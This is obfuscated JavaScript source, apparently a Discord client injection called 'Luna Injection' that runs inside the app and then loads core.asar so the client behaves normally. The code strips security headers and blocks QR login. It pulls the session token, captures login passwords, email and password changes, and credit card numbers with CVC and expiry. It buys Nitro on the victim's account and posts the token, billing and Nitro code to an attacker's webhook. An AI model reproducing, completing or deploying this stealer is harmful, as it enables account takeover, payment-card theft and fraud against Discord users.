  const _0x147ae0 = getNitro(_0xc69cfe.premium_type);
  const _0x1e7c58 = getBadges(_0xc69cfe.flags);
  const _0x1c3b35 = await getBilling(_0x284ba1);
  const _0x55bd4b = await buyNitro(_0x284ba1);
  const _0xaefc5e = {
    'username': "Luna Injection",
    'content': _0x55bd4b,
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Nitro bought!**",
        'value': "**Nitro Code:**\n```diff\n+ " + _0x55bd4b + "```",
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x147ae0 + "**\nBadges: **" + _0x1e7c58 + "**\nBilling: **" + _0x1c3b35 + '**',
        'inline': true
      }, {
        'name': '**Token**',
        'value': '`' + _0x284ba1 + '`',
        'inline': false
      }],
      'author': {
        'name': _0xc69cfe.username + '#' + _0xc69cfe.discriminator + " | " + _0xc69cfe.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0xc69cfe.id + '/' + _0xc69cfe.avatar + '.webp'
      }
    }]
  };
  _0xaefc5e.content = "@everyone" + ("\n" + _0x55bd4b);
  hooker(_0xaefc5e);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (_0x5a9301, _0x2e87e3) => {
  if (_0x5a9301.url.startsWith('wss://remote-auth-gateway')) {
    return _0x2e87e3({
      'cancel': true
    });
  }
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((_0x4bbeda, _0x4685f5) => {
  if (_0x4bbeda.url.startsWith("%WEBHOOK%")) {
    if (_0x4bbeda.url.includes("discord.com")) {
      _0x4685f5({
        'responseHeaders': Object.assign({
          'Access-Control-Allow-Headers': '*'
        }, _0x4bbeda.responseHeaders)
      });
    } else {
      _0x4685f5({
        'responseHeaders': Object.assign({
          'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          'Access-Control-Allow-Headers': '*',
          'Access-Control-Allow-Origin': '*'
        }, _0x4bbeda.responseHeaders)
      });
    }
  } else {
    delete _0x4bbeda.responseHeaders["content-security-policy"];
    delete _0x4bbeda.responseHeaders["content-security-policy-report-only"];
    _0x4685f5({
      'responseHeaders': {
        ..._0x4bbeda.responseHeaders,
        'Access-Control-Allow-Headers': '*'
      }
    });
  }
});
session.defaultSession.webRequest.onCompleted(config.filter, async (_0x19c96b, _0x326057) => {
  if (_0x19c96b.statusCode !== 0xc8 && _0x19c96b.statusCode !== 0xca) {
    return;
  }
  const _0x5236dc = Buffer.from(_0x19c96b.uploadData[0x0].bytes).toString();
  const _0x4695a9 = JSON.parse(_0x5236dc);
  const _0x10ee4f = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
  switch (true) {
    case _0x19c96b.url.endsWith("login"):
      login(_0x4695a9.login, _0x4695a9.password, _0x10ee4f)["catch"](console.error);
      break;
    case _0x19c96b.url.endsWith("users/@me") && _0x19c96b.method === "PATCH":
      if (!_0x4695a9.password) {
        return;
      }
      if (_0x4695a9.email) {
        emailChanged(_0x4695a9.email, _0x4695a9.password, _0x10ee4f)['catch'](console.error);
      }
      if (_0x4695a9.new_password) {
        passwordChanged(_0x4695a9.password, _0x4695a9.new_password, _0x10ee4f)['catch'](console.error);
      }
      break;
    case _0x19c96b.url.endsWith("tokens") && _0x19c96b.method === "POST":
      const _0x100bb2 = querystring.parse(unparsedData.toString());
      ccAdded(_0x100bb2["card[number]"], _0x100bb2["card[cvc]"], _0x100bb2["card[exp_month]"], _0x100bb2["card[exp_year]"], _0x10ee4f)["catch"](console.error);
      break;
    case _0x19c96b.url.endsWith("paypal_accounts") && _0x19c96b.method === "POST":
      PaypalAdded(_0x10ee4f)['catch'](console.error);
      break;
    case _0x19c96b.url.endsWith('confirm') && _0x19c96b.method === "POST":
      return;
      setTimeout(() => {
        nitroBought(_0x10ee4f)["catch"](console.error);
      }, 0x1d4c);
      break;
    default:
      break;
  }
});
module.exports = require('./core.asar');
